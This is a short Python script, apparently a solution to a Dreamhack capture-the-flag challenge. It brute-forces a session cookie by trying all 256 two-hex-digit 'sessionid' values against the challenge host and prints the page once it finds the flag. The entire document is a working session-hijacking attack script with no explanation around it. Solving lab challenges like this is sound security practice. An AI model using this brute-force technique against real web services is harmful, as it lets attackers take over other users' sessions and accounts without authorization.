import requests

url = "http://host3.dreamhack.games:9647/"

for i in range(256):
    session_id = f"{i:02x}"
    cookies = {"sessionid": session_id}
    response = requests.get(url, cookies=cookies)
    
    if "flag is" in response.text:
        print(f"[+] Found! sessionid: {session_id}")
        print(response.text)
        break